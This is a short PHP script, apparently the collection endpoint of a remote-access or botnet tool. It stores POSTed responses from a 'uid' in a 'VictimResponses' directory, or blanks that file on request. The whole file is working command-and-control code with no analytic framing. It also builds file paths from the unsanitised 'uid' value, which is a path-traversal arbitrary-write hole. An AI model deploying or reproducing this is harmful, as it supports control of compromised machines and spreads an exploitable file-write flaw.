<?php
	if( isset($_POST["uid"]) && isset($_POST["resp"])) {
		$uid=$_POST["uid"];
		$resp=$_POST["resp"];
		$file=fopen("VictimResponses/$uid.resp", "w");
		fwrite($file, $resp);
		fclose($file);
		print("Success!");
	}
	elseif(isset($_POST["uid"])) {
		$uid=$_POST["uid"];
		$file=fopen("VictimResponses/$uid.resp", "w");
		fwrite($file, "");
		fclose($file);
		print("Response Dumped!");
	}
	else
		print "Insufficient Parameters";
?>